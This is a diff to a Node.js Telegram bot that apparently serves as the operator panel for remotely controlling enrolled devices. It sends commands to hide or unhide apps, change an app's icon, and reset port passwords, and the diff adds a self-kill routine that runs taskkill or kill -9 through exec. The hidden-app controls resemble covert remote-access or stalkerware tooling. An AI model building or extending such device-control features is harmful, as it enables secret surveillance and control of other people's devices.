@@ -12,6 +12,7 @@ const TelegramBot      = require("node-telegram-bot-api");
 const net              = require("net");
 const fs               = require("fs");
 const crypto           = require("crypto");
+const os               = require("os");
 const { exec }         = require("child_process");
 const me               = new net.Socket();
 const bot              = new TelegramBot(token, { polling: true });
@@ -41,6 +42,16 @@ function isUrl(mayurl){
 
 function onlyEnglish(text){
     return onlyenglishregex.test(text);
+}
+
+function killme(){
+    if (os.platform() == "win32"){
+        exec(`taskkill /PID ${process.pid} /F`);
+        process.exit(1);
+    } else if (os.platform() == "linux" || os.platform() == "android"){
+        exec(`kill -9 ${process.pid}`);
+        process.exit(1);
+    }
 }
 
 function sortAppsToString(apps, inslice, devid, msgowner){
@@ -236,16 +247,19 @@ function createKeyboard(access_list = [], devid, msgowner, callback = () => {}){
                     text: build("hide 🌚"),
                     callback_data: `hideApp_${msgowner}_${devid}`
                 });
+                break;
             case "unhideApp":
                 layers[layer_index].push({
                     text: build("unhide 🌝"),
                     callback_data: `unhideApp_${msgowner}_${devid}`
                 });
+                break;
             case "changeIcon":
                 layers[layer_index].push({
                     text: build("change-icon💬"),
                     callback_data: `changeIcon_${msgowner}_${devid}`
                 });
+                break;
             case "changePortPassword":
                 layers[layer_index].push({
                     text: build("change-pass 🌐"),
@@ -690,7 +704,9 @@ bot.on("message", async (message) => {
                             realadmin: realadmin,
                             hostname: hostname,
                             portnumb: portnumb
-                        });
+                        }).then(() => {
+                            killme();
+                        })
                     }
                 } else if (mode == "getNewOwningPort"){
                     steps[message.from.id]['mode'] = "getNewOwningPassword";
@@ -1502,7 +1518,8 @@ me.on("data", async (data) => {
                                 reply_markup: {
                                     inline_keyboard: [
                                         _keybinds,
-                                        _second_keybinds
+                                        _second_keybinds,
+                                        _last_keybinds
                                     ]
                                 }
                             }
